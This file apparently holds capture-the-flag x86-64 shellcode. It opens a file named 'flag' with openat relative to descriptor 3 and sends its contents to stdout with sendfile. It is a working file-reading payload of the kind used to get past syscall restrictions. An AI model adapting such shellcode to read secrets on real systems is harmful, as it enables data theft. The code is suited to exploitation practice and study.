.global _start
.intel_syntax noprefix
_start:
    push   0x67616c66
    mov    rsi, rsp
    push   0x3
    pop    rdi
    xor    edx, edx
    xor    eax, eax
    mov    ax, 0x101
    syscall
    push   0x55
    pop    r10
    push   0x1
    pop    rdi
    xor    edx, edx
    mov    rsi, rax
    push   0x28
    pop    rax
    syscall
